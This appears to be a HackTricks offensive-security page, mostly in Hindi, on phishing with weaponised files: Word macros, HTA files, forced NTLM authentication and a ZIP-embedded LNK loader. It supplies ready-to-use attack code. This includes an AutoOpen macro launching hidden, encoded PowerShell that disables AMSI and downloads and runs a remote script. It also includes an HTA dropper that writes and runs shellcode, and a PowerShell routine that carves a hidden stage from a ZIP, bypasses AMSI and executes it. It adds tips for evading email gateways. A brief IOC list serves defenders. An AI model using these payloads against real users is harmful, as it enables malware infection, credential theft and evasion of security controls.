# Phishing Files & Documents

{{#include ../../banners/hacktricks-training.md}}

## Office Documents

Microsoft Word फ़ाइल खोलने से पहले फ़ाइल डेटा सत्यापन करता है। डेटा सत्यापन OfficeOpenXML मानक के विरुद्ध डेटा संरचना पहचान के रूप में किया जाता है। यदि डेटा संरचना पहचान के दौरान कोई त्रुटि होती है, तो विश्लेषण की जा रही फ़ाइल नहीं खोली जाएगी।

आमतौर पर, Word फ़ाइलें जिनमें macros होते हैं वे `.docm` एक्सटेंशन का उपयोग करती हैं। हालांकि, फ़ाइल एक्सटेंशन बदलकर फ़ाइल का नाम बदलना संभव है और फिर भी उनकी macro executing capabilities को बनाए रखा जा सकता है.\
उदाहरण के लिए, एक RTF फ़ाइल डिज़ाइन के अनुसार macros को सपोर्ट नहीं करती, लेकिन एक DOCM फ़ाइल जिसे RTF में नाम बदला गया है, Microsoft Word द्वारा संभाली जाएगी और macro execution के लिए सक्षम होगी.\
यही आंतरिक संरचनाएँ और तंत्र Microsoft Office Suite (Excel, PowerPoint etc.) के सभी सॉफ़्टवेयर पर लागू होते हैं।

You can use the following command to check which extensions are going to be executed by some Office programs:
```bash
assoc | findstr /i "word excel powerp"
```
macros शामिल करने वाले रिमोट टेम्पलेट को संदर्भित करने वाली DOCX फ़ाइलें (File –Options –Add-ins –Manage: Templates –Go) भी macros को “execute” कर सकती हैं।

### External Image Load

Go to: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

दस्तावेज़ से arbitrary code चलाने के लिए macros का उपयोग किया जा सकता है।

#### Autoload functions

जो अधिक सामान्य होंगे, उतनी ही अधिक संभावना है कि AV उन्हें detect कर लेगा।

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### मैन्युअल रूप से मेटाडेटा हटाएँ

Go to **File > Info > Inspect Document > Inspect Document**, जो Document Inspector खोलेगा। **Inspect** पर क्लिक करें और फिर **Document Properties and Personal Information** के बगल में **Remove All** पर क्लिक करें।

#### Doc Extension

When finished, select **Save as type** dropdown, change the format from **`.docx`** to **Word 97-2003 `.doc`**.\
Do this because you **can't save macro's inside a `.docx`** and there's a **stigma** **around** the macro-enabled **`.docm`** extension (e.g. the thumbnail icon has a huge `!` and some web/email gateway block them entirely). Therefore, this **legacy `.doc` extension is the best compromise**.

#### दुर्भावनापूर्ण Macros जनरेटर

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA फ़ाइलें

HTA एक Windows प्रोग्राम है जो **HTML और scripting languages (such as VBScript and JScript)** को मिलाता है। यह यूज़र इंटरफ़ेस बनाता है और ब्राउज़र की सुरक्षा मॉडल की सीमाओं के बिना "fully trusted" एप्लिकेशन के रूप में चलता है।

HTA को **`mshta.exe`** का उपयोग करके चलाया जाता है, जो आमतौर पर **Internet Explorer** के साथ **installed** रहता है, जिससे **`mshta` dependant on IE** हो जाता है। इसलिए यदि इसे uninstall कर दिया गया है, तो HTAs चलाने में असमर्थ होंगे।
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM प्रमाणीकरण मजबूर करना

NTLM प्रमाणीकरण को **"remotely" मजबूर करने** के कई तरीके हैं; उदाहरण के लिए, आप उपयोगकर्ता द्वारा एक्सेस किए जाने वाले **invisible images** को emails या HTML में जोड़ सकते हैं (यहां तक कि HTTP MitM?). या शिकार को उन फाइलों का **address** भेजें जो केवल फोल्डर खोलने भर से ही एक **authentication** को **trigger** कर दें।

**इन विचारों और अधिक के लिए निम्न पृष्ठ देखें:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

यह मत भूलिए कि आप केवल हैश या प्रमाणीकरण चोरी ही नहीं कर सकते, बल्कि **perform NTLM relay attacks** भी कर सकते हैं:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

बहुत प्रभावी campaigns एक ZIP भेजते हैं जिसमें दो वैध decoy दस्तावेज़ (PDF/DOCX) और एक malicious .lnk होता है। चाल यह है कि असली PowerShell loader ZIP के raw bytes में एक unique marker के बाद संचित रहता है, और .lnk उसे carve करके पूरी तरह memory में चला देता है।

एक आम फ़्लो जो .lnk PowerShell one-liner द्वारा लागू होता है:

1) मूल ZIP को सामान्य paths में ढूँढें: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, और वर्तमान working directory का parent।
2) ZIP bytes पढ़ें और एक hardcoded marker ढूँढें (उदा., xFIQCV). marker के बाद सब कुछ embedded PowerShell payload होता है।
3) ZIP को %ProgramData% में copy करें, वहाँ extract करें, और वैध दिखने के लिए decoy .docx खोलें।
4) वर्तमान process के लिए AMSI को bypass करें: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) अगले चरण को deobfuscate करें (उदा., सभी # कैरैक्टर हटाना) और उसे memory में execute करें।

Example PowerShell skeleton to carve and run the embedded stage:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
नोट्स
- डिलीवरी अक्सर प्रतिष्ठित PaaS subdomains (e.g., *.herokuapp.com) का दुरुपयोग करती है और payloads को gate कर सकती है (IP/UA के आधार पर benign ZIPs परोसना)।
- अगला चरण अक्सर base64/XOR shellcode को decrypt करता है और disk artifacts को कम करने के लिए Reflection.Emit + VirtualAlloc के माध्यम से execute करता है।

Persistence used in the same chain
- COM TypeLib hijacking of the Microsoft Web Browser control ताकि IE/Explorer या इसे embed करने वाला कोई भी app payload को स्वतः पुन: लॉन्च कर दे। विवरण और ready-to-use commands यहाँ देखें:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- archive data के अंत में appended ASCII marker string (उदा., xFIQCV) वाले ZIP files।
- .lnk जो parent/user folders को enumerate करता है ताकि ZIP locate कर सके और एक decoy document खोलता है।
- AMSI tampering via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- trusted PaaS domains के अंतर्गत host किए गए links के साथ समाप्त होने वाले long-running business threads।

## Windows files to steal NTLM hashes

Check the page about **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## संदर्भ

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)

{{#include ../../banners/hacktricks-training.md}}
